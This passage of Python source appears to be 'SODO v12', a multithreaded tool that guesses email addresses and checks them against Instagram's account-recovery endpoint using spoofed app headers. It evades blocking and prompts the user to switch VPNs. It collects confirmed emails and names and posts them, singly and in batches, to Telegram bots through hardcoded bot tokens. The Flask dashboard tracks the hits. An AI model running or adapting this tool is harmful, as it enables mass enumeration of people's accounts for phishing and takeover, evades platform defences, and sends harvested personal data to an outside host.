                "INTERNAL__latency_qpl_marker_id":   36707139,
                "INTERNAL__latency_qpl_instance_id": random.uniform(6.3e13, 6.5e13),
            }
        }),
        'bk_client_context':  json.dumps({"bloks_version": BLOKS_VERSION, "styles_id": "instagram"}),
        'bloks_versioning_id': BLOKS_VERSION
    }
    headers = {
        'User-Agent':           ua,
        'accept-language':      'en-IN, en-US',
        'x-bloks-version-id':   BLOKS_VERSION,
        'x-ig-android-id':      android,
        'x-ig-app-id':          '567067343352427',
        'x-ig-device-id':       device,
        'x-ig-family-device-id': family,
        'x-mid':                base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id':  f'UFS-{uuid.uuid4()}-0',
        'Content-Type':         'application/x-www-form-urlencoded; charset=UTF-8'
    }
    for attempt in range(retries + 1):
        try:
            r = session.post(url, data=payload, headers=headers, timeout=3)
            if is_blocked(r.text, r.status_code):
                time.sleep(random.uniform(3.0, 7.0))
                return "blocked"
            return email.lower() in r.text.lower()
        except Exception:
            if attempt < retries:
                time.sleep(0.3)
            else:
                return False

print("\033[1;94m--- SODO v12 Starting, Please Wait... ---\033[0m\n")
time.sleep(1); clear()

red     = "\033[1m\033[31m"; green   = "\033[1m\033[32m"
yellow  = "\033[1m\033[33m"; cyan    = "\033[1m\033[36m"
white   = "\033[1m\033[37m"; reset   = '\033[0m'
magenta = "\033[1m\033[35m"

logo = _make_logo()

def print_logo():
    print("\x1b[1;39m—"*60); print(logo); print("\x1b[1;39m—"*60); print('')

token   = "8880154979:AAFbR8XG2JO5bbmd7-AdYMn-XqcOsW5mpJk"
chat_id = "8502412097"
token2   = "8808870951:AAFJkvhDXrvtHtCmAYpA828EAUS2wAZ8nXk"
chat_id2 = "8502412097"

_threads_env = os.environ.get("THREADS", "").strip()
if _threads_env:
    try:
        threads = max(1, min(int(_threads_env), 1000))
    except ValueError:
        threads = 300
    print(f"\033[1m\033[32m[*] THREADS env var → {threads}\033[0m")
else:
    print(f"ENTER THREAD COUNT \033[1m\033[33m(recommended: 300-400)\033[0m")
    try:
        threads = int(input("➜ ").strip())
        threads = max(1, min(threads, 1000))
    except (ValueError, EOFError):
        threads = 300
clear()

HITS_FILE = 'Tempmail.txt'
seen_emails = set()

if os.path.exists(HITS_FILE):
    print(f"\033[1m\033[33m[*] Previous hits file found — re-checking all logs\033[0m\n")
    time.sleep(1)

priority_queue = Queue()

hit           = 0
bad_ig        = 0
blocked_ct    = 0
total         = 0
start_time    = time.time()
lock          = Lock()
pattern_hits   = {p: 0 for p in PATTERN_NAMES}
pattern_checks = {p: 0 for p in PATTERN_NAMES}
VPN_WARN_THRESHOLD = 100

batch_hits  = []
batch_lock  = Lock()
batch_queue = Queue()
BATCH_SIZE  = 100

tg_queue = Queue()

def tg_sender_thread():
    while True:
        mail, h, pat, name = tg_queue.get()
        msg = (
            f"------------------------------\n"
            f"GOT A HIT BY SODO v12\n"
            f"------------------------------\n"
            f"TOTAL HITS : {h}\n"
            f"NAME       : {name}\n"
            f"EMAIL      : {mail}\n"
            f"PATTERN    : {pat}\n"
            f"------------------------------\n"
            f"HIT BY : @S0DOHU\n"
            f"------------------------------"
        )
        for _ in range(3):
            try:
                r = requests.post(
                    f"https://api.telegram.org/bot{token}/sendMessage",
                    data={'chat_id': chat_id, 'text': msg},
                    timeout=10
                )
                resp = r.json()
                if resp.get('ok'):
                    break
                retry_after = resp.get('parameters', {}).get('retry_after', 2)
                time.sleep(retry_after)
            except Exception:
                time.sleep(2)
        time.sleep(1.1)
        tg_queue.task_done()

def send_telegram(mail, h, pat, name):
    tg_queue.put((mail, h, pat, name))

def batch_sender_thread():
    batch_number = 0
    while True:
        emails_100 = batch_queue.get()
        batch_number += 1
        with lock:
            top3 = sorted(pattern_hits.items(), key=lambda x: x[1], reverse=True)[:3]
        top3_str = " | ".join(f"{p}:{c}" for p,c in top3 if c > 0) or "—"
        content  = '\n'.join(emails_100).encode('utf-8')
        filename = f"sodo_hits_batch_{batch_number}_{int(time.time())}.txt"
        caption  = (
            f"SODO v12 — Batch #{batch_number}\n"
            f"Emails: {len(emails_100)}\n"
            f"Total hits so far: {hit}\n"
            f"Top patterns: {top3_str}\n"
            f"Auto-tune cycles: {_tune_count}\n"
            f"HIT BY : @S0DOHU"
        )
        for _ in range(3):
            try:
                r = requests.post(
                    f"https://api.telegram.org/bot{token2}/sendDocument",
                    data={'chat_id': chat_id2, 'caption': caption},
                    files={'document': (filename, content, 'text/plain')},
                    timeout=20
                )
                resp = r.json()
                if resp.get('ok'):
                    break
                retry_after = resp.get('parameters', {}).get('retry_after', 2)
                time.sleep(retry_after)
            except Exception:
                time.sleep(2)
        batch_queue.task_done()

def hits_per_min():
    elapsed = (time.time() - start_time) / 60
    return round(hit / elapsed, 2) if elapsed > 0.01 else 0.0

def top_pattern():
    if not any(pattern_hits.values()):
        return "—"
    best  = max(pattern_hits, key=pattern_hits.get)
    bh    = pattern_hits[best]
    bc    = pattern_checks.get(best, 0)
    rate  = f"{bh/bc:.4f}" if bc > 0 else "?"
    return f"{best}  h={bh}  r={rate}"

def top_domain():
    if not any(domain_hits.values()):
        return "—"
    best = max(domain_hits, key=domain_hits.get)
    bh = domain_hits[best]
    bc = domain_checks.get(best, 0)
    rate = f"{bh/bc:.4f}" if bc > 0 else "?"
    return f"{best}  h={bh}  r={rate}"

def domain_stat_lines():
    rows = []
    for d in DOMAINS:
        chk  = domain_checks.get(d, 0)
        h    = domain_hits.get(d, 0)
        ban  = domain_blocked.get(d, 0)
        rate = f"{h/chk:.4f}" if chk > 0 else "—"
        label = d.replace('@', '')
        rows.append(
            f"  {cyan}{label:<18}{reset}"
            f"  chk={yellow}{chk:<6}{reset}"
            f"  hit={green}{h:<4}{reset}"
            f"  ban={red}{ban:<4}{reset}"
            f"  rate={magenta}{rate}{reset}"
        )
    return "\n".join(rows)

def status():
    clear()
    with batch_lock:
        pending_in_batch = len(batch_hits)
    vpn_line = ""
    if blocked_ct >= VPN_WARN_THRESHOLD:
        vpn_line = f"\n{red}  ⚠  VPN SWITCH KARO — {blocked_ct} BLOCKS  ⚠{reset}\n"
    pq_size = priority_queue.qsize()
    with hot_lock:
        hot_count = len(hot_seeds)
    tune_line = f"{cyan}#{_tune_count}{reset}" if _tune_count > 0 else f"{yellow}warming...{reset}"
    print(f"""
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
𝐇𝐈𝐓          ➜ {green}{hit}{reset}
𝐇𝐈𝐓/𝐌𝐈𝐍      ➜ {green}{hits_per_min()}{reset}
𝐁𝐀𝐓𝐂𝐇 𝐁𝐔𝐅𝐅𝐄𝐑  ➜ {magenta}{pending_in_batch}/{BATCH_SIZE}{reset}
𝐏𝐑𝐈𝐎 𝐐        ➜ {cyan}{pq_size}{reset}
𝐇𝐎𝐓 𝐒𝐄𝐄𝐃𝐒    ➜ {magenta}{hot_count}/55{reset}
𝐁𝐀𝐃 𝐈𝐆       ➜ {red}{bad_ig}{reset}
𝐁𝐋𝐎𝐂𝐊𝐄𝐃      ➜ {yellow}{blocked_ct}{reset}
𝐓𝐎𝐓𝐀𝐋        ➜ {yellow}{total}{reset}
𝐓𝐇𝐑𝐄𝐀𝐃𝐒     ➜ {cyan}{threads}{reset}
𝐓𝐎𝐏 𝐏𝐀𝐓      ➜ {magenta}{top_pattern()}{reset}
𝐓𝐎𝐏 𝐃𝐎𝐌      ➜ {cyan}{top_domain()}{reset}
𝐀𝐔𝐓𝐎-𝐓𝐔𝐍𝐄    ➜ {tune_line}
𝐖𝐄𝐁 𝐃𝐀𝐒𝐇     ➜ {cyan}port {PORT}{reset}
▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𝐃𝐎𝐌𝐀𝐈𝐍 𝐒𝐓𝐀𝐓𝐒
{domain_stat_lines()}
▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𝐃𝐄𝐕 — @S0DOHU   |   𝐯12
▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱{vpn_line}""")

def queue_neighborhood(prefix_only):
    base = ''.join(c for c in prefix_only if c.isalpha())
    if not base:
        return
    with lock:
        for es in EXPAND_SUFFIXES:
            ep = base + es
            for d in DOMAINS:
                full = ep + d
                if full not in seen_emails:
                    seen_emails.add(full)
                    priority_queue.put((full, "expand"))

def queue_mutations(prefix_only, original_pat):
    muts = generate_mutations(prefix_only)
    with lock:
        for m in muts:
            for d in DOMAINS:
                full = m + d
                if full not in seen_emails:
                    seen_emails.add(full)
                    priority_queue.put((full, "hotseed"))

# ─── FLASK WEB SERVER ─────────────────────────────────────────────────────────
_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SODO v12</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#080808;color:#00ff41;font-family:'Courier New',monospace;font-size:13px;padding:16px}
h1{font-size:22px;letter-spacing:4px;color:#39ff14;margin-bottom:4px}
.sub{color:#555;font-size:11px;margin-bottom:16px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
@media(max-width:680px){.grid{grid-template-columns:1fr}}
.card{border:1px solid #1a1a1a;border-radius:4px;padding:14px;background:#0d0d0d}
.card h2{font-size:11px;letter-spacing:2px;color:#444;text-transform:uppercase;margin-bottom:10px;border-bottom:1px solid #1a1a1a;padding-bottom:6px}
.stat{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #111}
.stat .k{color:#555}
.v{color:#39ff14;font-weight:bold}.vr{color:#ff4444;font-weight:bold}
.vy{color:#ffcc00;font-weight:bold}.vc{color:#00cfff;font-weight:bold}.vm{color:#cc88ff;font-weight:bold}
table{width:100%;border-collapse:collapse;font-size:11px}
th{color:#444;text-align:left;padding:4px 6px;border-bottom:1px solid #1a1a1a;font-weight:normal;letter-spacing:1px}
td{padding:4px 6px;border-bottom:1px solid #111;color:#aaa}
td.h{color:#39ff14}td.b{color:#ff4444}td.r{color:#ffcc00}
.hlist{max-height:360px;overflow-y:auto;padding-right:4px}
.hrow{padding:6px 0;border-bottom:1px solid #111;line-height:1.6}
.hrow .n{color:#555;min-width:38px;display:inline-block}
.hrow .nm{color:#39ff14;font-weight:bold}
.hrow .em{color:#00cfff;font-size:11px;display:block;margin-left:38px}
.hrow .pt{color:#555;font-size:10px}
.dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#39ff14;margin-right:6px;animation:p 1.4s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.25}}
#ts{color:#222;font-size:10px;margin-top:12px;text-align:right}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:#111}::-webkit-scrollbar-thumb{background:#333}
</style>
</head>
<body>
<h1>◈ SODO v12</h1>
<p class="sub"><span class="dot"></span>LIVE &nbsp;|&nbsp; refresh 3s &nbsp;|&nbsp; @S0DOHU</p>
<div class="grid">
  <div class="card">
    <h2>Counters</h2>
    <div id="ctr"></div>
  </div>
  <div class="card">
    <h2>Domain Stats</h2>
    <table><thead><tr><th>Domain</th><th>Checks</th><th>Hits</th><th>Bans</th><th>Rate</th></tr></thead>
    <tbody id="dtbl"></tbody></table>
    <div style="margin-top:12px" id="meta"></div>
  </div>
  <div class="card" style="grid-column:1/-1">
    <h2>Recent Hits <span id="hcnt" style="color:#333;font-size:10px"></span></h2>
    <div class="hlist" id="hlist"></div>
  </div>
</div>
<p id="ts"></p>
<script>
async function tick(){
  try{
    const d=await(await fetch('/api/stats')).json();
    const rows=[['Hits',d.hit,'v'],['Hit / min',d.hpm,'v'],
      ['Total checks',d.total,'vy'],['Blocked',d.blocked,'vr'],
      ['Bad IG',d.bad_ig,'vr'],['Threads',d.threads,'vc'],
      ['Prio queue',d.prio_q,'vc'],['Batch buffer',d.batch_buf,'vm'],
      ['Hot seeds',d.hot_seeds+'/55','vm'],['Auto-tune',d.tune_cycles,'v']];
    document.getElementById('ctr').innerHTML=rows.map(([k,v,c])=>
      `<div class="stat"><span class="k">${k}</span><span class="${c}">${v}</span></div>`).join('');
    document.getElementById('dtbl').innerHTML=d.domains.map(r=>
      `<tr><td>${r.name}</td><td>${r.checks}</td><td class="h">${r.hits}</td><td class="b">${r.bans}</td><td class="r">${r.rate}</td></tr>`).join('');
    document.getElementById('meta').innerHTML=[['Top pattern',d.top_pattern,'vc'],['Top domain',d.top_domain,'vc']].map(([k,v,c])=>
      `<div class="stat"><span class="k">${k}</span><span class="${c}">${v}</span></div>`).join('');
    document.getElementById('hcnt').textContent='('+d.recent_hits.length+')';
    document.getElementById('hlist').innerHTML=d.recent_hits.map(h=>
      `<div class="hrow"><span class="n">#${h.hit_num}</span><span class="nm">${h.name}</span> <span class="pt">[${h.pattern}]</span><span class="em">${h.email}</span></div>`
    ).join('')||'<span style="color:#222;font-size:11px">waiting for first hit...</span>';
    document.getElementById('ts').textContent='updated '+new Date().toLocaleTimeString();
  }catch(e){}
}
tick();setInterval(tick,3000);
</script>
</body>
</html>"""


def _build_flask_app():
    app = Flask(__name__)

    @app.route('/health')
    def health():
        return Response("OK", status=200, mimetype='text/plain')

    @app.route('/')
    def dashboard():
        return _HTML

    @app.route('/api/stats')
    def api_stats():
        with lock:
            _h  = hit; _tot = total; _bad = bad_ig; _blk = blocked_ct
            _ph = dict(pattern_hits); _pc = dict(pattern_checks)
            _dh = dict(domain_hits);  _dc = dict(domain_checks)
            _db = dict(domain_blocked)
        with batch_lock:
            _bbuf = len(batch_hits)
        with hot_lock:
            _hs = len(hot_seeds)
        elapsed = max((time.time() - start_time) / 60, 0.01)
        hpm     = round(_h / elapsed, 2)
        if any(_ph.values()):
            bp  = max(_ph, key=_ph.get)
            bc  = _pc.get(bp, 0)
            tpat = f"{bp}  h={_ph[bp]}  r={_ph[bp]/bc:.4f}" if bc else f"{bp}  h={_ph[bp]}"
        else:
            tpat = "—"
        if any(_dh.values()):
            bd  = max(_dh, key=_dh.get)
            bdc = _dc.get(bd, 0)
            tdom = f"{bd}  h={_dh[bd]}  r={_dh[bd]/bdc:.4f}" if bdc else f"{bd}  h={_dh[bd]}"
        else:
            tdom = "—"
        dom_rows = []
        for d in DOMAINS:
            chk  = _dc.get(d, 0)
            h_   = _dh.get(d, 0)
            ban  = _db.get(d, 0)
            rate = f"{h_/chk:.4f}" if chk > 0 else "—"
            dom_rows.append({"name": d, "checks": chk, "hits": h_, "bans": ban, "rate": rate})
        with _hits_lock:
            rh = list(recent_hits)
        return jsonify({
            "hit": _h, "hpm": hpm, "total": _tot,
            "blocked": _blk, "bad_ig": _bad,
            "threads": threads, "prio_q": priority_queue.qsize(),
            "batch_buf": f"{_bbuf}/{BATCH_SIZE}",
            "hot_seeds": _hs, "tune_cycles": _tune_count,
            "top_pattern": tpat, "top_domain": tdom,
            "domains": dom_rows, "recent_hits": rh,
        })

    return app


def flask_thread():
    if not _FLASK_OK:
        return
    app = _build_flask_app()
    import logging
    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=PORT, threaded=True)

# ─── WORKER ───────────────────────────────────────────────────────────────────
def worker():
    global hit, bad_ig, blocked_ct, total
    session = build_session()
    while True:
        try:
            if not priority_queue.empty():
                try:
                    email, pat = priority_queue.get_nowait()
                except Exception:
                    domain = pick_domain()
                    prefix, pat = smart_prefix(domain)
                    email = prefix + domain
            else:
                domain = pick_domain()
                prefix, pat = smart_prefix(domain)
                email  = prefix + domain

            with lock:
                if email in seen_emails:
                    continue
                seen_emails.add(email)
                total += 1
                dom = '@' + email.split('@')[-1]
                if dom in domain_checks:
                    domain_checks[dom] = domain_checks.get(dom, 0) + 1

            result = check_instagram_email(session, email)

            with lock:
                pattern_checks[pat] = pattern_checks.get(pat, 0) + 1

            if result == "blocked":
                with lock:
                    blocked_ct += 1
                    _bdom = '@' + email.split('@')[-1]
                    domain_blocked[_bdom] = domain_blocked.get(_bdom, 0) + 1
                    if blocked_ct % 10 == 0:
                        status()
                session = build_session()

            elif result is True:
                prefix_only = email.split('@')[0]
                dom = '@' + email.split('@')[-1]

                with lock:
                    for d in DOMAINS:
                        other = prefix_only + d
                        if other not in seen_emails:
                            seen_emails.add(other)
                            priority_queue.put((other, pat + "+dup"))

                queue_neighborhood(prefix_only)
                queue_mutations(prefix_only, pat)

                with hot_lock:
                    hot_seeds.append(prefix_only)

                with lock:
                    hit += 1
                    h_snap = hit
                    pattern_hits[pat] = pattern_hits.get(pat, 0) + 1
                    if dom in domain_hits:
                        domain_hits[dom] = domain_hits.get(dom, 0) + 1

                name = extract_name(email.split('@')[0])

                if len(name) < 4:
                    print(f'{yellow}✓ skip short [{pat}]: {email}{reset}')
                else:
                    print(f'{green}✓ HIT [{pat}]: {name} → {email}{reset}')
                    with open(HITS_FILE, 'a') as f:
                        f.write(f"NAME: {name} | EMAIL: {email} | PATTERN: {pat}\n")
                    with _hits_lock:
                        recent_hits.appendleft({
                            "name":    name,
                            "email":   email,
                            "pattern": pat,
                            "hit_num": h_snap,
                        })
                    send_telegram(email, h_snap, pat, name)
                    with batch_lock:
                        batch_hits.append(email)
                        if len(batch_hits) >= BATCH_SIZE:
                            snapshot = batch_hits[:BATCH_SIZE]
                            del batch_hits[:BATCH_SIZE]
                            batch_queue.put(snapshot)

            else:
                with lock:
                    bad_ig += 1

        except Exception:
            session = build_session()
            time.sleep(0.5)

# ─── MAIN ─────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    sa_count  = len(SA_NAMES)
    gl_count  = len(GLOBAL_NAMES)
    print_logo()
    print(f"{green}[*] SODO v12 — Render web layer: /health + /api/stats + live dashboard{reset}")
    print(f"{green}[*] SA pool: {sa_count} | Global pool: {gl_count}{reset}")
    print(f"{green}[*] Domain weights auto-tune every {AUTO_TUNE_INTERVAL} checks{reset}")
    print(f"{green}[*] Hot seeds: last 55 hits bias + heavy mutation on every hit{reset}")
    print(f"{green}[*] Flask dashboard → 0.0.0.0:{PORT}  health → /health{reset}\n")
    time.sleep(1)

    def display_loop():
        while True:
            time.sleep(5)
            status()

    Thread(target=tg_sender_thread,   daemon=True).start()
    Thread(target=batch_sender_thread, daemon=True).start()
    Thread(target=display_loop,        daemon=True).start()
    Thread(target=auto_tune_thread,    daemon=True).start()
    Thread(target=flask_thread,        daemon=True).start()

    for _ in range(threads):
        Thread(target=worker, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{red}stopped. hits saved to {HITS_FILE}{reset}")
